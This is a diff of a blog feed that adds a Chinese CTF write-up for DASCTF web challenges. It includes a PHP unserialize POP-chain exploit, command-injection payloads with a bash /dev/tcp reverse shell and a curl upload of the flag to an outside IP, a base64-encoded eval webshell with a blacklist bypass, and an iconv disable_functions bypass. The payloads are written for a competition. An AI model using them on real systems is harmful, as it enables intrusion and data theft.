-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">module  EXP<span class="regexp">//</span>    INTERNAL    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br><span class="line">module  INTERNAL    EXP<span class="regexp">//</span>    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>之后去手动构造的上传点<strong>s4.php</strong>上传这两个文件，再去webshell页面<strong>s2.php</strong>执行下面的代码触发exp，完成反弹shell。</p>
-<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">sh=putenv(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);include(&#x27;php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.iconv.<span class="built_in">exp</span>.utf-<span class="number">8</span>/resource=/tmp/<span class="built_in">exp</span>.so&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>查看flag权限，发现只有root能读</p>
-<p><img src="/images/BUU/20220412213148.png"></p>
-<p>康康suid命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find /usr/bin -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><code>nl</code>能用，虚惊一场（我在期待什么啊可恶</p>
-<p><img src="/images/BUU/20220412212616.png"></p>
-]]></content>
-      <tags>
-        <tag>php</tag>
-        <tag>upload</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DASCTF X FATE 四月防疫挑战赛 web1 &amp; web2</title>
     <url>/2022/04/28/%5BDASCTF-FATE%5Dweb-pwn/</url>
     <content><![CDATA[<h1 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h1><p><a href="https://files.buuoj.cn/files/45743698d2fda6f2ee15021bcb38f6f4/2.zip">题目附件</a>给了四个<code>class</code>源码文件，<code>Base</code>，<code>Filter extends Base</code>，<code>ListView extends Base</code>，<code>TestView extends ListView</code></p>
@@ -487,6 +369,124 @@
         <tag>python</tag>
         <tag>sql</tag>
         <tag>ssti</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DASCTF X SU 三月春季挑战赛 web</title>
+    <url>/2022/04/13/%5BDASCTF-SU%5Dall-web/</url>
+    <content><![CDATA[<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>热身题 链子如下</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">fin::__destruct</span><br><span class="line">what::__toString</span><br><span class="line">mix::run</span><br><span class="line">crow::__invoke</span><br><span class="line">fin::__call</span><br><span class="line">mix::get_flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$m1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$f2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$m2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span>-&gt;f1 = <span class="variable">$w</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;a = <span class="variable">$m1</span>;</span><br><span class="line"><span class="variable">$m1</span>-&gt;m1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;v1 = <span class="variable">$f2</span>;</span><br><span class="line"><span class="variable">$f2</span>-&gt;f1 = <span class="variable">$m2</span>;</span><br><span class="line"><span class="variable">$m2</span>-&gt;m1=<span class="string">&quot;?&gt;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$f1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>命令执行点注意闭合前面的<code>&lt;?php</code>标签绕过<code>#</code>注释符的说。</p>
+<p><img src="/images/BUU/20220412221927.png"></p>
+<p>这么多文件，小孩子才做选择，大人全都要</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">$m2-&gt;m1=&quot;?&gt;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat *&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>藏在注释里的flag</p>
+<p><img src="/images/BUU/20220412222531.png"></p>
+<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>题目贴心地给出了源码附件呢</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>最开始以为是ssti，只是上了个有亿点狠的waf</p>
+<p>手动测试了常见的payload后感觉<code>eval()</code>应该是重伤倒地了，得找找还有没有其它命令执行点的说。</p>
+<p>正好下面还有个<code>os.system()</code>，相当于</p>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">time</span> ip &#123;payload&#125; &gt; ./tmp/<span class="built_in">log</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p>waf把<code>;</code> <code>&amp;</code>都过滤了，截断不能（瘫</p>
+<p>但其实截不截断的都无所谓啦，只要我们想执行的代码能跑就行，因此还是比较容易想到套娃式处理命令的反引号的。</p>
+<p>这里我最开始以自己对重定向的理解试了试不用<code>&amp;</code>构造一个野鸡版反弹shell，均以失败告终（悲</p>
+<p>其中的迷惑操作包括但不限于</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>#`bash%<span class="number">20</span>-i%<span class="number">200</span>&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>%<span class="number">201</span>&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure>
+
+<p><del>（学习中 求轻喷）</del></p>
+<p>说实话一直对重定向的<code>&amp;</code>符似懂非懂 越往下挖越接近底层实现了 挖了个陨石坑属于是</p>
+<p>所以就改成分步执行命令了</p>
+<p>直接写命令的话会在<code>eval()</code>处报错而跳过<code>os.system()</code>，因此用<code>#</code>注释符注释掉要执行的命令，待绕过waf后它仍会正常跑的。</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>#`whoami&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUU/20220413172345.png"></p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>#`ls&gt;<span class="regexp">/dev/</span>tcp<span class="regexp">/233.33.3.333/</span><span class="number">2333</span>`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUU/20220413151334.png"></p>
+<p>把flag存进<code>./tmp/log.txt</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">1#</span><span class="language-bash">`<span class="built_in">cat</span>%20T*`</span></span><br></pre></td></tr></table></figure>
+
+<p>再利用<code>curl</code>把<code>./tmp/log.txt</code>带出来</p>
+<blockquote>
+<p>-F参数用来向服务器上传二进制文件。</p>
+<p>$ curl -F ‘file=@photo.png’ <a href="http://233.33.3.333">http://233.33.3.333</a></p>
+<p>上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。</p>
+</blockquote>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>#`curl%<span class="number">20</span>-F%<span class="number">20</span>flag=@tmp/log.txt%<span class="number">20</span>http://<span class="number">233.33.3.333:2333</span>`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUU/20220413203858.png"></p>
+<h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>上传综合题，挺久没做了的说，生疏了好多（悲</p>
+<p><img src="/images/BUU/20220412135630.png"></p>
+<p>要求文件后缀为.php，这题不对劲，危</p>
+<p>上传个pureshell逝逝</p>
+<p><img src="/images/BUU/20220412140609.png"></p>
+<p>可恶，你发现了甚么</p>
+<p>得收集更多信息才行，phpinfo看一下</p>
+<p><img src="/images/BUU/20220412141143.png"></p>
+<p>成功上传，感谢出题师傅放行</p>
+<p>啊哈哈哈哈<strong>disable_functions</strong>来咯（悲</p>
+<p><img src="/images/BUU/20220412141602.png"></p>
+<p>哭完还得上路，试试能不能把后端源码抓出来</p>
+<p><code>highlight_file()</code>被禁了，而同类型的<code>show_source()</code>并没有出现在<strong>disable_functions</strong>里</p>
+<p><img src="/images/BUU/20220412143440.png"></p>
+<p>可恶，又被发现了</p>
+<p><code>base64_decode()</code>一下看能不能绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;c2hvd19zb3VyY2U=&#x27;</span>))(<span class="string">&#x27;../index.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到waf源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fun</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>strstr()</code>对大小写敏感，这里的blacklist只需用大小写就能绕过了。</p>
+<p>接下来写webshell</p>
+<p>先上传一个文件<strong>s1.php</strong>，一句话的<code>$</code>被过滤了，因此base64编码</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">PD9waHAgZXZhbCgkX1BPU1RbJ3NoJ10pOz8+</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sh&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>再上传第二个文件<strong>s2.php</strong>去解码<strong>s1.php</strong>的内容并包含，<code>-</code>被过滤了，也得编码一部分再解回来</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1lMTQxM2MwN2MyYzRjODc2ZTYwMTVhMzUwMjM0OGQzMC5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=e1413c07c2c4c876e6015a3502348d30.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>利用文件包含特性和伪协议达到写webshell的目的，太棒了</p>
+<p><img src="/images/BUU/20220412154256.png"></p>
+<p>这时试图用蚁剑直接连接却失败了，应该是<strong>disable_functions</strong>里把蚁剑使用的函数也都禁用了，看来出题师傅想教给我们的还有更多呢。</p>
+<p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions</a></p>
+<p>使用这种更接近底层的绕过手段的前提就是要做到任意文件上传，于是乎对照题目的前后端手动构造了一个没有waf的上传页面的源码<strong>s3.php</strong></p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij48Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPui1nue+juWkqumYs++8gTxpbnB1dCBjbGFzcz0iaW5wdXRfZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkX2ZpbGUiLz48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJ1cGxvYWQiLz48L2Zvcm0+PC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+PD9waHAgbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZF9maWxlJ11bJ3RtcF9uYW1lJ10sIi90bXAvIi4kX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyduYW1lJ10pOz8+</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;light&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;glow&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span>赞美太阳！<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span 